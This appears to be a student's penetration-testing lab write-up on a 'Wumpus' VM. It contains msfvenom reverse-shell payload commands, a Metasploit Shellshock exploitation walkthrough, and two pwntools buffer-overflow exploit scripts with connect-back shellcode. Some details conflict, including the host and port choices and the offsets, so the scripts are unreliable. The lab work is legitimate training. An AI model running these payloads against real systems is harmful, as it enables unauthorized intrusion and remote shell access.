
*by Vaughn Valle*
## Part 1

### Question 1
#### a)
For attacking the x86 Linux target: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.31.33.33 LPORT=4444 -f elf`. I chose reverse TCP shell because it initiates a connection from the target back to your machine, bypassing simple NAT configurations. You'll need to start a listener with `nc -lvp 4444`, transfer the payload to the target, make it executable, and execute it.
#### b)
With the target behind a firewall blocking incoming connections, we can use a payload that leverages allowed outbound connections on common ports like HTTP/HTTPS: `msfvenom -p linux/x86/meterpreter/reverse_https LHOST=172.31.33.33 LPORT=443 -f elf`. Port 443 is typically allowed for outbound traffic.
### Question 2
For an unknown service on an uncommon port, I would first interact with it directly using netcat (`nc target_ip port`) to observe its behavior and input handling. I'd send various protocol handshakes to identify the service, look for version banners, try basic fuzzing techniques, and document any abnormal responses that might indicate vulnerabilities.

### Question 3
EIP (Extended Instruction Pointer) is a register in x86 architecture that points to the next instruction to be executed. It controls program flow by determining which code runs next. This is critical for exploitation because overwriting EIP allows redirecting execution to arbitrary code like shellcode, which is the foundation of buffer overflow attacks.
### Question 4
Antivirus works through signature-based detection (matching against known patterns), heuristic analysis (identifying suspicious behaviors), and sandbox execution (isolating and observing file behavior). Evasion techniques include: encoding/encryption to avoid signature detection; obfuscation to change code structure while maintaining functionality; polymorphic code that automatically modifies itself; process injection to hide in legitimate processes; in-memory execution to avoid disk writes; and timestomping to alter file metadata.
### Question 5
Reasons to exploit vulnerabilities during penetration testing: demonstrating real impact beyond theoretical findings; validating vulnerabilities and eliminating false positives; uncovering deeper privilege escalation paths; creating realistic attack scenarios for incident response training; and testing the effectiveness of detection and prevention security controls.
### Question 6
Reasons not to exploit vulnerabilities: risk of system instability or service disruption in production environments; legal liability if exploitation exceeds scope; potential violation of compliance requirements; time constraints when other testing priorities exist; sufficient evidence already exists without exploitation; and client specifically prohibits exploitation in the rules of engagement.

## Part 2 – Technical

#### Modified Networking for Wumpus VM
Had to modify `/etc/network/interfaces` to use DHCP so that the VM is on the same subnet as attacking machine
![[Pasted image 20250409214605.png]]
#### Lab Setup
Wumpus VM: `192.168.1.37`
Host VM (Arch): `192.168.1.179`
![[Pasted image 20250409214619.png]]
### Question 7a

`nmap -p- -sV 192.168.1.37` would reveal open ports on the Wumpus VM, likely showing port 80/tcp running Apache and potentially other services relevant to the assignment.
![[Pasted image 20250409215210.png]]

This took a long while. From the output, it seems like the service running on port `20666` is returning weird data, like a webpage?

I wanted to see the webserver running on `8080`, so I created a Twingate resource to access the VM itself
![[Pasted image 20250409215937.png]]

Then typed `https://192.168.1.37:8080` in my browser URL
![[Pasted image 20250409215959.png]]
System Status link shows
![[Pasted image 20250409220013.png]]

Hmmm...Shellshock protection flaw?
### Question 7b

To test for the vulnerability mentioned on the webserver, we can do `nmap -sS -sV --script=http-shellshock 192.168.1.37 -p 8080`. This would check for the Shellshock vulnerability in CGI scripts, with output indicating vulnerability status.
![[Pasted image 20250409220109.png]]
We've confirmed that the webserver is vulnerable to the Shellshock vulnerability!

Now I need to switch to my Kali machine for some Metasploit fun!
![[Pasted image 20250409220423.png]]
### Question 7c
I'll do a simple search about shellshock to see any relevant exploits
![[Pasted image 20250409220532.png]]
Here we can see that there are multiple modules to take advantage of, but the metasploit module `exploit/multi/http/apache_mod_cgi_bash_env_exec` would likely work against the target's Apache server, exploiting the Shellshock vulnerability in CGI scripts.
### Question 7d

To gain a shell we use `use exploit/multi/http/apache_mod_cgi_bash_env_exec` and set the parameters accordingly
![[Pasted image 20250409224710.png]]
Now we got a meterpreter session! We can use `shell` to get shell access
![[Pasted image 20250409224832.png]]
### Question 7e

The exploited user was determined with the `whoami` command after we got shell access previously.
![[Pasted image 20250409224858.png]]

### Question 8a
Analyzing `./wummpus` under Binja, we can see that the program, specifically the `readAction()` function, uses unsafe methods like `gets()` and `strcpy()`. Here's the control flow graph
![[Pasted image 20250409231332.png]]
And this is the vulnerable function in use.
![[Pasted image 20250409231648.png]]
Since these functions don't offer protection for oversized inputs, they are susceptible to buffer overflow when given an input size far larger than the buffer size.

Here's the normal behavior of the program. We are given the address of `main()` which has relative address of `0x1289` from base.
![[Pasted image 20250409232321.png]]
![[Pasted image 20250409232233.png]]
Here I used python to play around the input to overflow our buffer
```bash
python3 -c "print('A' * [number])" | ./wumpus
```
![[Pasted image 20250409232554.png]]
At `400` we get segfault. Let's try something smaller like `350`
![[Pasted image 20250409232707.png]]
At `350` we don't overflow it yet. After trial and error I've found that the limit is `366`. The program crashes when we give it an input of `366` bytes (`365` was fine) 
![[Pasted image 20250409232906.png]]
### Question 8b

Given that previously, we found the buffer limit to be *365 bytes*, to find the EIP offset, we can generate a unique pattern with `pattern_create.rb -l <length>`, send it to Wumpus, and note the value in EIP after crash, then calculate the offset with `pattern_offset.rb -q <value_in_EIP>`. We can do all of this in `gef` with

```gdb
pattern create <number>
run
pattern offset <value_in_EIP
```
I've found the offset value needed to be *373 bytes* to overwrite EIP
### Question 8c

We identified the null byte (`\x00`) and newline character (`\x0a`) as problematic "bad characters" for our exploit. This was verified through two approaches:

1. **Dynamic Testing:** We sent a sequence of potential bad characters (`\x01` to `\xff`) followed by padding and an EIP overwrite marker (`BBBB`). When `\x0a` was included in the sequence, the EIP overwrite failed. Removing `\x0a` allowed the overwrite to succeed.
2. **Static Analysis:** Decompiling the program with Binja revealed the use of `gets()` and `strcpy()`. Standard C library behavior dictates that `gets()` stops reading at a newline (`\x0a`, or `\x0d` on Windows), and `strcpy()` stops copying at a null byte (`\x00`). These characters would prematurely terminate our payload.

Therefore, when generating our shellcode, we ensured it avoided the characters `\x00`, `\x0a`, and `\x0d`.
### Question 8d

Here we can use a reverse shell as our payload. The following `msfvenom` command creates a reverse shell payload avoiding any identified bad characters.

```bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.37 LPORT=4444 -f python -e x86/shikata_ga_nai -b “\x0a\x0d\x00”
```
### Question 8e

A buffer overflow exploit would include the exact buffer size to reach EIP, an address pointing to a JMP ESP instruction to control execution flow, a NOP sled to handle memory variances, and the shellcode payload. The complete script would need specific memory addresses determined through debugging.

Here we can use `pwntools` to integrate with `python` and make our lives easier
```bash
pip install pwntools --break-system-packages
```

```python
from pwn import *

# Set the context for pwntools (architecture, OS)
context.arch = 'i386'
context.os = 'linux'

sh = asm(shellcraft.i386.linux.connect("0.0.0.0", 4444) +
         shellcraft.i386.linux.dupsh('edx'))

log.info(f"Shellcode length: {len(sh)} bytes")

padding_len = 369 - len(sh)
if padding_len < 0:
    log.error("Shellcode is longer than the available space before Saved EBP!")
    exit(1)
padding = b'A' * padding_len

saved_ebp = b'B' * 4

return_address = p32(0xb7c080ad) # Pack the address for i386 little-endian

extra_bytes = b"\xff\xe0" # jmp eax instruction

# Combine all parts into the final payload
payload = sh + padding + saved_ebp + return_address + extra_bytes

log.info(f"Total payload length: {len(payload)} bytes")
try:
    target_binary = './wumpus'
    p = process(target_binary)
except FileNotFoundError:
    log.error(f"Target binary '{target_binary}' not found.")
    exit(1)

log.info("Sending the payload...")
p.sendline(payload)


log.success("Payload sent! If exploit worked, a shell should connect back.")
log.info("Run 'nc -lvnp 4444' in another terminal to catch the shell.")

p.close()
```

![[Pasted image 20250409235549.png]]
![[Pasted image 20250410001835.png]]
### Question 8f

Similar to the previous question, to get a shell on the Wumpus VM we start a listener with `nc -nlvp 4444`, execute the exploit script targeting the Wumpus game service, verify shell access with basic commands like `whoami` and `pwd`. However we need to change the `HOST` and `PORT` number to the remote machine which is on `192.168.1.37` with the vulnerable service running on port `20666`
```python
from pwn import *

# Set the context for pwntools (architecture, OS)
context.arch = 'i386'
context.os = 'linux'

sh = asm(shellcraft.i386.linux.connect("192.168.1.37", 20666) +
         shellcraft.i386.linux.dupsh('edx'))

log.info(f"Shellcode length: {len(sh)} bytes")

padding_len = 369 - len(sh)
if padding_len < 0:
    log.error("Shellcode is longer than the available space before Saved EBP!")
    exit(1)
padding = b'A' * padding_len

saved_ebp = b'B' * 4

return_address = p32(0xb7c080ad) # Pack the address for i386 little-endian

extra_bytes = b"\xff\xe0" # jmp eax instruction

# Combine all parts into the final payload
payload = sh + padding + saved_ebp + return_address + extra_bytes

log.info(f"Total payload length: {len(payload)} bytes")
try:
    target_binary = './wumpus'
    p = process(target_binary)
except FileNotFoundError:
    log.error(f"Target binary '{target_binary}' not found.")
    exit(1)

log.info("Sending the payload...")
p.sendline(payload)


log.success("Payload sent! If exploit worked, a shell should connect back.")
log.info("Run 'nc -lvnp 4444' in another terminal to catch the shell.")

p.close()
```
![[Pasted image 20250410001905.png]]